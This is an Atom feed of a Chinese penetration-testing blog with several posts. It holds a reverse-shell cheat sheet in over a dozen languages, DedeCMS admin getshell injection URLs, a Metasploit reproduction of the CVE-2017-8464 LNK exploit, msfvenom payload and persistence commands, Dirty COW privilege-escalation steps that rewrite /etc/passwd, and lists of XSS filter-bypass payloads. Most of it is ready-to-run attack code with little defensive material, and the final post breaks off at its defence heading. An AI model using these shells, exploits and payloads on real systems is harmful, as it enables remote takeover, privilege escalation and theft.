<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>SuNu11&#39;Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://sunu11.com/"/>
  <updated>2018-04-03T06:29:22.853Z</updated>
  <id>http://sunu11.com/</id>
  
  <author>
    <name>SuNu11</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DedeCMS V5.7 SP2后台漏洞小集合</title>
    <link href="http://sunu11.com/2018/04/03/19/"/>
    <id>http://sunu11.com/2018/04/03/19/</id>
    <published>2018-04-03T06:20:22.000Z</published>
    <updated>2018-04-03T06:29:22.853Z</updated>
    
    <content type="html"><![CDATA[<h3 id="记录一下最新版dedecms后台拿服务器的几个方式。"><a href="#记录一下最新版dedecms后台拿服务器的几个方式。" class="headerlink" title="记录一下最新版dedecms后台拿服务器的几个方式。"></a>记录一下最新版dedecms后台拿服务器的几个方式。</h3><p><strong>01、上传shell</strong></p><p>1、后台上传flash文件处未对文件内容作校验，可直接上传shell。<br>2、通过重命名功能：<a id="more"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/dede/file_manage_control.php?fmdo=rename&amp;oldfilename=/uploads/media/xxx/xxxx.swf&amp;newfilename=/sunu11.php</div></pre></td></tr></table></figure><p><strong>02、写入配置</strong><br>/dede/sys_verifies.php中可写进恶意代码至inc文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1、http://localhost/dedecms/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[0]=123&amp;refiles[1]=\%22;eval($_GET[a]);die();//</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">2、http://localhost/dedecms/uploads/dede/sys_verifies.php?action=down&amp;a=phpinfo();</div></pre></td></tr></table></figure><p><strong>03、数据库写入数据未过滤：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/dedecms/uploads/dede/stepselect_main.php?action=addenum_save&amp;ename=xxx&amp;egroup=;phpinfo();$&amp;issign=1</div></pre></td></tr></table></figure><p>查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://localhost/dedecms/uploads/dede/sys_cache_up.php?step=2&amp;egroup=a=1;phpinfo();&amp;dopost=ok</div><div class="line">or:</div><div class="line">http://localhost/data/enums/;phpinfo();$.php</div></pre></td></tr></table></figure><p><strong>05、模板问题：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/dede/tag_test_action.php?url=a&amp;token=xxxxx&amp;partcode=&#123;dede:mochazz name=&apos;source&apos; runphp=&apos;yes&apos;&#125;phpinfo();&#123;/dede:mochazz&#125;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;记录一下最新版dedecms后台拿服务器的几个方式。&quot;&gt;&lt;a href=&quot;#记录一下最新版dedecms后台拿服务器的几个方式。&quot; class=&quot;headerlink&quot; title=&quot;记录一下最新版dedecms后台拿服务器的几个方式。&quot;&gt;&lt;/a&gt;记录一下最新版dedecms后台拿服务器的几个方式。&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;01、上传shell&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、后台上传flash文件处未对文件内容作校验，可直接上传shell。&lt;br&gt;2、通过重命名功能：
    
    </summary>
    
      <category term="代码审计" scheme="http://sunu11.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Dedecms" scheme="http://sunu11.com/tags/Dedecms/"/>
    
      <category term="getshell" scheme="http://sunu11.com/tags/getshell/"/>
    
      <category term="后台" scheme="http://sunu11.com/tags/%E5%90%8E%E5%8F%B0/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透之反弹shell的几种姿势</title>
    <link href="http://sunu11.com/2018/01/26/18/"/>
    <id>http://sunu11.com/2018/01/26/18/</id>
    <published>2018-01-26T04:19:50.000Z</published>
    <updated>2018-03-06T12:03:38.486Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ofum8yjv2.bkt.clouddn.com/18.1.jpg" alt="^.^"></p><h3 id="主要反弹方式"><a href="#主要反弹方式" class="headerlink" title="主要反弹方式"></a>主要反弹方式</h3><blockquote><p>首先vps监听：<code>nc –l –vv –p port</code><a id="more"></a></p></blockquote><p><strong>1.bash反弹</strong><br>利用系统特殊设备文件/dev/tcp建立socket发出去，达到反弹shell的效果<br><code>bash -i&gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></p><p><strong>2.telnet反弹</strong><br>适用于nc不可用或者/dev/tcp不可用条件下，其中mknod是创建设备文件<br><code>mknod test p &amp;&amp; telnet ip port 0&lt;test | /bin/bash 1&gt;test</code></p><p><strong>3.Java</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">r = Runtime.getRuntime()</div><div class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</div><div class="line">p.waitFor()</div></pre></td></tr></table></figure></p><p><strong>4.Ruby</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e&apos;f=TCPSocket.open(&quot;ip&quot;,port).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</div></pre></td></tr></table></figure></p><p>不依赖于/bin/sh的shell：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;ip&quot;,&quot;port&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</div></pre></td></tr></table></figure></p><p><strong>5.PHP</strong><br><code>php -r &#39;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p><p><strong>6.Python(2.7)</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</div></pre></td></tr></table></figure></p><p>另外的形式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c &quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&apos;ip&apos;,port))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</div></pre></td></tr></table></figure></p><p><strong>7.Perl</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;use Socket;$i=&quot;ip&quot;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</div></pre></td></tr></table></figure></p><p>不依赖于/bin/sh的shell：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -MIO -e &apos;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;</div></pre></td></tr></table></figure></p><p><img src="http://ofum8yjv2.bkt.clouddn.com/18.2.jpg" alt="18-1"></p><p><strong>8.nc</strong><br>linux：<code>nc -e /bin/sh ip port</code><br>Windows：<code>nc -e cmd.exe ip port</code><br>当不能使用-e参数时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mknod backpipe p &amp;&amp; nc ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe</div><div class="line">/bin/sh | nc ip port</div><div class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc ip port 0/tmp/</div></pre></td></tr></table></figure></p><p>nc版本有问题时：<br><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f</code></p><p><strong>9.lua</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;ip&apos;,&apos;port&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</div></pre></td></tr></table></figure></p><p><strong>10.gawk</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/gawk -f</div><div class="line"></div><div class="line">BEGIN &#123;</div><div class="line">        Port    =       8080</div><div class="line">        Prompt  =       &quot;bkd&gt; &quot;</div><div class="line"></div><div class="line">        Service = &quot;/inet/tcp/&quot; Port &quot;/0/0&quot;</div><div class="line">        while (1) &#123;</div><div class="line">                do &#123;</div><div class="line">                        printf Prompt |&amp; Service</div><div class="line">                        Service |&amp; getline cmd</div><div class="line">                        if (cmd) &#123;</div><div class="line">                                while ((cmd |&amp; getline) &gt; 0)</div><div class="line">                                        print $0 |&amp; Service</div><div class="line">                                close(cmd)</div><div class="line">                        &#125;</div><div class="line">                &#125; while (cmd != &quot;exit&quot;)</div><div class="line">                close(Service)</div><div class="line">        &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>11、awk</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">awk &apos;BEGIN&#123;s=&quot;/inet/tcp/0/192.168.1.128/8080&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&apos;</div></pre></td></tr></table></figure></p><p>参考链接：<br><a href="http://www.freebuf.com/articles/system/147768.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/147768.html</a><br><a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="external">https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ofum8yjv2.bkt.clouddn.com/18.1.jpg&quot; alt=&quot;^.^&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;主要反弹方式&quot;&gt;&lt;a href=&quot;#主要反弹方式&quot; class=&quot;headerlink&quot; title=&quot;主要反弹方式&quot;&gt;&lt;/a&gt;主要反弹方式&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;首先vps监听：&lt;code&gt;nc –l –vv –p port&lt;/code&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="http://sunu11.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="nc" scheme="http://sunu11.com/tags/nc/"/>
    
      <category term="反弹shell" scheme="http://sunu11.com/tags/%E5%8F%8D%E5%BC%B9shell/"/>
    
  </entry>
  
  <entry>
    <title>LNK文件（快捷方式）远程代码执行漏洞（复现）</title>
    <link href="http://sunu11.com/2017/08/29/17/"/>
    <id>http://sunu11.com/2017/08/29/17/</id>
    <published>2017-08-29T12:26:59.000Z</published>
    <updated>2018-02-26T04:44:55.026Z</updated>
    
    <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>名称：CVE-2017-8464 LNK文件（快捷方式）远程代码执行漏洞</p><p>概要：攻击者可以通过可移动驱动器（U盘）或远程共享等方式将包含恶意LNK文件和与之相关<a id="more"></a>的恶意二进制文件传播给用户。当用户通过Windows资源管理器或任何能够解析LNK文件的程序打开恶意的LNK文件时，与之关联的恶意二进制代码将在目标系统上执行。</p><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><p>攻击机kali：192.168.86.180</p><p>靶机win10（64位）：192.168.86.177</p><p>首先kali下载exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd /opt</div><div class="line">Wget   https://raw.githubusercontent.com/ykoster/metasploit-framework/169e00bf3442447324df064192db62cdc5b5b860/modules/exploits/windows/fileformat/cve_2017_8464_lnk_rce.rb</div></pre></td></tr></table></figure></p><p>  copy exp到/usr/share/metasploit-framework/modules/exploit/windows/smb/目录下<br><code>cp  cve_2017_8464_lnk_rce.rb  /usr/share/metasploit-framework/modules/exploits/windows/smb/</code></p><p>生成监听shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler   使用exploit/multi/handler监听连入的backdoor</div><div class="line">msf exploit(handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp 设置对应的payload</div><div class="line">msf exploit(handler) &gt; set LHOST 192.168.86.180</div><div class="line">msf exploit(handler) &gt; exploit -j</div></pre></td></tr></table></figure><p>生成.LNK文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">use exploit/windows/smb/cve_2017_8464_lnk_rce</div><div class="line">msf exploit(cve_2017_8464_lnk_rce) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp</div><div class="line">msf exploit(cve_2017_8464_lnk_rce) &gt; set LHOST 192.168.86.180</div><div class="line">msf exploit(cve_2017_8464_lnk_rce) &gt; exploit</div></pre></td></tr></table></figure><p>将生成的dll文件和以U盘盘符结尾的.LNK文件复制到U盘中；当插入U盘至主机，在靶机上双击.LNK文件，即可触发dll文件建立连接。</p><p><img src="http://ofum8yjv2.bkt.clouddn.com/q-21.png" alt="q-1"><br><img src="http://ofum8yjv2.bkt.clouddn.com/q-22.png" alt="q-2"></p><h3 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h3><p>桌面系统：Windows 10, 7, 8.1, 8, Vista和Windows RT 8.1<br>服务器系统：Windows Server 2016，2012，2008</p><h3 id="修复："><a href="#修复：" class="headerlink" title="修复："></a>修复：</h3><p>桌面系统Windows 10,7,8.1和Windows RT 8.1；服务器系统：Windows Server 2016，2012，2008，可以通过Windows Update自动更新微软补丁的方式进行修复。<br>Windows 8, Vista可以通过选择对应版本然后手动更新补丁的方式进行更新<br>（补丁下载地址参考）<a href="https://support.microsoft.com/zh-cn/help/4025687/microsoft-security-advisory-4025685-guidance-for-older-platforms" target="_blank" rel="external">https://support.microsoft.com/zh-cn/help/4025687/microsoft-security-advisory-4025685-guidance-for-older-platforms</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h3&gt;&lt;p&gt;名称：CVE-2017-8464 LNK文件（快捷方式）远程代码执行漏洞&lt;/p&gt;
&lt;p&gt;概要：攻击者可以通过可移动驱动器（U盘）或远程共享等方式将包含恶意LNK文件和与之相关
    
    </summary>
    
      <category term="渗透测试" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="CVE-2017-8464" scheme="http://sunu11.com/tags/CVE-2017-8464/"/>
    
      <category term="漏洞复现" scheme="http://sunu11.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>msfvenom生成payload的方法</title>
    <link href="http://sunu11.com/2017/08/29/16/"/>
    <id>http://sunu11.com/2017/08/29/16/</id>
    <published>2017-08-29T12:10:56.000Z</published>
    <updated>2018-02-26T04:25:52.913Z</updated>
    
    <content type="html"><![CDATA[<h4 id="二进制文件"><a href="#二进制文件" class="headerlink" title="二进制文件"></a>二进制文件</h4><p>Windows<a id="more"></a></p><p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT= Port -f exe &gt; shell.exe</code></p><p>Linux</p><p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= IP LPORT= Port -f elf &gt; shell.elf</code></p><p>Mac</p><p><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST= IP LPORT= Port -f macho &gt; shell.macho</code></p><h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><p>PHP</p><p><code>msfvenom -p php/meterpreter_reverse_tcp LHOST= IP LPORT= Port -f raw &gt; shell.php</code></p><p>ASP</p><p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=Port -f asp &gt; shell.asp</code></p><p>JSP</p><p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST= IP LPORT= Port -f raw &gt; shell.jsp</code></p><p>WAR</p><p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST= IP LPORT=Port -f war &gt; shell.war</code></p><h4 id="脚本shell（反弹shell）"><a href="#脚本shell（反弹shell）" class="headerlink" title="脚本shell（反弹shell）"></a>脚本shell（反弹shell）</h4><p>Python</p><p><code>msfvenom -p cmd/unix/reverse_python LHOST= IP LPORT=Port -f raw &gt; shell.py</code></p><p>Bash</p><p><code>msfvenom -p cmd/unix/reverse_bash LHOST= IP LPORT=Port -f raw &gt; shell.sh</code></p><p>Perl</p><p><code>msfvenom -p cmd/unix/reverse_perl LHOST= IP LPORT=Port -f raw &gt; shell.pl</code></p><h4 id="附：持续控制"><a href="#附：持续控制" class="headerlink" title="附：持续控制"></a>附：持续控制</h4><p>在攻击成功之后会反弹回一个会话，当木马被删除或不继续运行时，我们就无法再获得反弹的会话，那么想要进行一个持续的控制就需要在第一次获得会话时动一些手脚<br>run persistence -U -i 5 –r ip port<br>-U 用户登录时反弹会话 也可以使用-X当系统启动时反弹会话<br>-i 时间</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;二进制文件&quot;&gt;&lt;a href=&quot;#二进制文件&quot; class=&quot;headerlink&quot; title=&quot;二进制文件&quot;&gt;&lt;/a&gt;二进制文件&lt;/h4&gt;&lt;p&gt;Windows
    
    </summary>
    
      <category term="渗透测试" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="msfvenom" scheme="http://sunu11.com/tags/msfvenom/"/>
    
  </entry>
  
  <entry>
    <title>Dirty COW的那些事</title>
    <link href="http://sunu11.com/2017/08/28/15/"/>
    <id>http://sunu11.com/2017/08/28/15/</id>
    <published>2017-08-28T14:08:08.000Z</published>
    <updated>2017-08-29T12:11:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文又是一次笔记回顾，将doc的笔记用markdown写一遍，回顾一下23333333<a id="more"></a></p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>漏洞编号：CVE-2016-5195 </p><p>漏洞名称：脏牛（Dirty COW） </p><p>漏洞危害：低权限用户利用该漏洞技术可以在全版本 Linux 系统上实现本地提权 </p><p>影响范围：Linux 内核2.6.22 &lt; 3.9 (x86/x64)</p><p>原理:<br>Linux 内核的内存子系统在处理写入时复制（copy-on-write, COW）时产生了竞争条件（race<br>condition）。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。（A race condition was found in the way the Linux kernel’s memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings.） 竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码。利用这一漏洞，攻击者可在其目标系统提升权限，可以获得 root 权限。<br><em>*</em>利用：<a href="https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c" target="_blank" rel="external">exp</a></p><h3 id="复现与总结"><a href="#复现与总结" class="headerlink" title="复现与总结"></a>复现与总结</h3><p>在本地部署一个漏洞环境，使用web服务器上的大马反弹 shell后利用dirty cow 进行提权<br>    反弹shell：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -l -p 22222 -vv </div><div class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</div></pre></td></tr></table></figure></p><p>查看版本：<br><code>cat /proc/version、uname -a、lsb release -a</code>均可</p><p>编译：<br><code>gcc -pthread exp.c -o exp -lcrypt</code></p><p>执行./exp 即可为用户firefart 设置密码</p><p><img src="http://ofum8yjv2.bkt.clouddn.com/q-17.png" alt="q-13"></p><p>然后即可用添加的用户连接主机</p><p><img src="http://ofum8yjv2.bkt.clouddn.com/q-18.png" alt="q-18"></p><p>除此之外，还可以用下面一些方式进行提权（学习自互联网）<br>1)在/tmp/.pwn写入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line">echo MOOOOOOOOOOO</div><div class="line">/bin/bash</div></pre></td></tr></table></figure><p>chmod+x/tmp/.pwn<br>然后修改/etc/passwd中的shell指向<br><code>./dirtyc0w /etc/passwd root:x:0:0:root:/root:/tmp/.pwn</code></p><p>2)添加用户到sudo组</p><p><code>./dirtyc0w /etc/group &quot;$(sed&#39;s/\(sudo:x:.*:\)/\1test1/g&#39;/etc/group)&quot;</code></p><p>下次管理员再登陆的话 sudo su不需要密码</p><p>3)将/etc/passwd中的uid位改为0</p><p>4)注入shellcode到suid文件，比如最常见的2个文件<br><code>/usr/bin/crontab</code><br><code>/usr/bin/passwd</code></p><p>修复方案：</p><pre><code>Centos/RHEL更新sudo yum updateUbuntu/Debian更新sudo apt-get update &amp;&amp; sudo apt-get dist-upgrade</code></pre><p>更新到最新的内核版本即可。<strong><em>需要重启才能生效</em></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文又是一次笔记回顾，将doc的笔记用markdown写一遍，回顾一下23333333
    
    </summary>
    
      <category term="渗透测试" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="提权" scheme="http://sunu11.com/tags/%E6%8F%90%E6%9D%83/"/>
    
      <category term="Linux" scheme="http://sunu11.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>我与XSS的感情之路(3)</title>
    <link href="http://sunu11.com/2017/08/28/14/"/>
    <id>http://sunu11.com/2017/08/28/14/</id>
    <published>2017-08-28T07:18:08.000Z</published>
    <updated>2017-08-28T14:06:33.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h3><p>接着上一文过来，这一部分是个人的一些总结。对于挖掘xss漏洞，目的都是让自己的payload可以执行，在其探索的过程中，我个人首先会通过审查元素，了解其输入点，过滤规则，然后<a id="more"></a>再针对性的进行payload的构造。首先，输入框、flash、css、上传点、http头部的字段、第三方插件、能主动修改其参数值的任意参数等等，存在输入的地方都有可能存在xss。明确好目标后，我习惯先输入一堆测试字符看看其过滤规则：<br><code>&#39;&#39;;!--&quot;&lt;XSS&gt;=&amp;{()}/&#39;script、on、alert、prompt、confirm、&lt;script src=&quot;http://x.js&quot;&gt; %c0u003cimg+src%3d1+onerror%3dalert(/xss/)+%c0u003e……</code><br>一般都能判断出如何过滤的，就像之前做题的过程中，都是经过测试才有结果，才能对症下药。</p><p>然后对于过滤规则，我总结了这样几点：</p><h4 id="1、大小写："><a href="#1、大小写：" class="headerlink" title="1、大小写："></a>1、大小写：</h4><p><code>&lt;ScRIpT&gt;alert(&#39;123&#39;)&lt;/sCRIpT&gt;</code></p><h4 id="2、编码绕过："><a href="#2、编码绕过：" class="headerlink" title="2、编码绕过："></a>2、编码绕过：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.十六进制编码</div><div class="line">.jsfuck编码</div><div class="line">.url编码</div><div class="line">.unicode编码</div><div class="line">.加解密</div><div class="line">.HTML编码</div><div class="line">.hex编码</div><div class="line">.ASCII编码</div></pre></td></tr></table></figure><h4 id="3、绕过magic-quotes-gpc："><a href="#3、绕过magic-quotes-gpc：" class="headerlink" title="3、绕过magic_quotes_gpc："></a>3、绕过magic_quotes_gpc：</h4><p><code>&lt;script&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)&lt;/script&gt;</code></p><h4 id="4、闭合标签"><a href="#4、闭合标签" class="headerlink" title="4、闭合标签"></a>4、闭合标签</h4><p><code>&quot;&gt;&lt;script&gt;alert(/123/)&lt;/script&gt;</code><br><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><h4 id="5、标签绕过"><a href="#5、标签绕过" class="headerlink" title="5、标签绕过"></a>5、标签绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;</div><div class="line">&lt;button onclick=&quot;javascript:alert(&apos;xss&apos;)&gt;XSS&lt;/button&quot;&gt;</div><div class="line">&lt;title&gt;&lt;img a=&quot;&lt;/title&gt;&lt;img/src=1 onerror=alert(1)//&quot;&gt;</div><div class="line">&quot;onsubmit=javascript:alert(1)%20name=&quot;a</div><div class="line">&lt;svg/onload=prompt(1)&gt;等等</div></pre></td></tr></table></figure><h4 id="6、其他符号绕过"><a href="#6、其他符号绕过" class="headerlink" title="6、其他符号绕过"></a>6、其他符号绕过</h4><table><thead><tr><th>%0a alert(1);</th><th>%0a 换行符 %0d</th></tr></thead><tbody><tr><td>/**/</td><td>替换空格</td></tr></tbody></table><hr><p>%00           |截断</p><p><strong><em>另外在某些情况下，当”被过滤，可以在IE内核下使用两个反引号(`)TAB键上面的那个代替双引号.</em></strong></p><h5 id="7、双字母绕过-lt-img-ononerrorerror-quot-123-quot-gt-、-lt-script-gt-alalertert-123-lt-script-gt"><a href="#7、双字母绕过-lt-img-ononerrorerror-quot-123-quot-gt-、-lt-script-gt-alalertert-123-lt-script-gt" class="headerlink" title="7、双字母绕过 &lt;img ononerrorerror=&quot;123&quot;&gt;、&lt;script&gt;alalertert(123)&lt;/script&gt;"></a>7、双字母绕过 <code>&lt;img ononerrorerror=&quot;123&quot;&gt;、&lt;script&gt;alalertert(123)&lt;/script&gt;</code></h5><h5 id="8、宽字节绕过"><a href="#8、宽字节绕过" class="headerlink" title="8、宽字节绕过"></a>8、宽字节绕过</h5><p>gbxxxx系列的编码，那么我们尝试一下宽字节  <code>%c0 %bf  %5c</code></p><h4 id="9、其他事件绕过"><a href="#9、其他事件绕过" class="headerlink" title="9、其他事件绕过"></a>9、其他事件绕过</h4><p>（比如过滤了&lt;&gt;使用 <code>&quot;onmouseover=alert(11)  bad=</code>）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">  onload</div><div class="line">  onclick</div><div class="line">  onerror</div><div class="line">  prompt</div><div class="line">  confirm</div><div class="line">  onmousemove</div></pre></td></tr></table></figure></p><p><strong><em>附录1：</em></strong></p><table><thead><tr><th>type</th><th>Horizontal Tab</th><th>New line</th><th>Carriage Return</th></tr></thead><tbody><tr><td>URL</td><td>%09</td><td>%10</td><td>%13         </td></tr></tbody></table><p>空字符  (%00) 使得过滤器不能看到完整的 <code>&lt;script&gt;</code>标签. 只在 IE 6.0, IE 7.0 可以。</p><p><strong><em>附录2：</em></strong></p><table><thead><tr><th>blank</th><th>%20 </th></tr></thead><tbody><tr><td>/</td><td>%2F  </td></tr><tr><td>——</td><td>——</td></tr><tr><td>?</td><td>%3F</td></tr><tr><td>——</td><td>——</td></tr><tr><td>+</td><td>%2B</td></tr></tbody></table><h3 id="防御："><a href="#防御：" class="headerlink" 